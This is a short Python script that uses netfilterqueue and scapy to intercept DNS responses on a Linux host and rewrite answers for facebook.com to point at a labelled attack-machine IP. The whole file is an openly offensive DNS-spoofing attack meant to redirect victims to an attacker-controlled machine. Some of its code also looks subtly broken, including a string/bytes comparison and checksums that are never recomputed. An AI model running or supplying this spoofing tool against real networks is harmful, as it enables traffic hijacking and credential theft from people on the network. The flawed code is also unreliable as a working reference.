#!/usr/bin/python

# Run on Linux
from concurrent.futures import process
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    print(scapy_packet)
    # Look for DNS response
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "facebook.com" in qname:
            # Use attack machine IP
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.10")
            scapy_packet[scapy.DNS].an = answer
            # Set DNS answer count
            scapy_packet[scapy.DNS].ancount = 1

            packet.set_payload(str(scapy_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
